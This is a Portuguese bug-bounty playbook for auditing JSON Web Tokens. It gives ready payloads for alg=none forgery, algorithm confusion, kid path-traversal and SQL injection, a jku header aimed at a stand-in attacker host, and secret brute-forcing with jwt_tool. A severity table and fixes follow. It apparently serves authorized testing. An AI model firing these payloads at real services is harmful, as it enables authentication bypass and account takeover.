# Playbook: JWT Audit

## Primeiro passo
```
bounty_audit_jwt(token="<token_capturado>")
```
Retorna header, payload, issues detectadas e next_tests.

## Ataques prioritarios (2025)

### 1. alg=none bypass
```
header: {"alg":"none","typ":"JWT"}
payload: {"sub":"admin","exp":9999999999}
signature: ""
```
Reenviar `<b64header>.<b64payload>.` (signature vazia). Se aceito -> critical.

### 2. Algorithm confusion (HS256 usando chave publica RSA)
Se servidor usa RS256 e a chave publica eh exposta em /jwks.json:
- Baixar a chave publica
- Assinar um token HS256 usando a chave publica como secret
- Servidor que aceita "alg:HS256" e usa a publica para validar -> bypass

### 3. kid injection
```
header: {"alg":"HS256","kid":"../../../dev/null"}
```
Se kid usado em SQL: `{"kid":"key1' UNION SELECT 'secret'--"}`
Se kid usado em path: LFI para arquivo conhecido com conteudo previsivel.

### 4. jku/x5u SSRF
```
header: {"alg":"RS256","jku":"https://atacante.com/jwks.json"}
```
Servidor busca a URL -> SSRF + bypass de validacao.

### 5. Weak HS* secret
```
jwt_tool -C -d /path/to/wordlist.txt "<token>"
```
Usar rockyou.txt ou jwt-secrets-list.txt. Se achar -> forge qualquer claim.

### 6. Embedded public key (cnf, jwk)
Se header tem jwk embed, atacante substitui por sua propria chave.

## Tabela de severidade
| Cenario | Severity |
|---|---|
| alg=none aceito | Critical |
| Weak secret brute-forcavel | Critical |
| Algorithm confusion | Critical |
| kid injection (SQLi/LFI) | High |
| jku SSRF | High |
| Sem exp claim | Medium |
| Sem aud/iss validation | Low-Medium |

## Fixes a sugerir no relatorio
- Lista branca de algoritmos (jamais aceitar "none")
- Validar `alg` esperado no servidor, nao confiar no header
- jwks com kid em lookup de chaves pre-cadastradas
- Sempre validar `exp`, `nbf`, `aud`, `iss`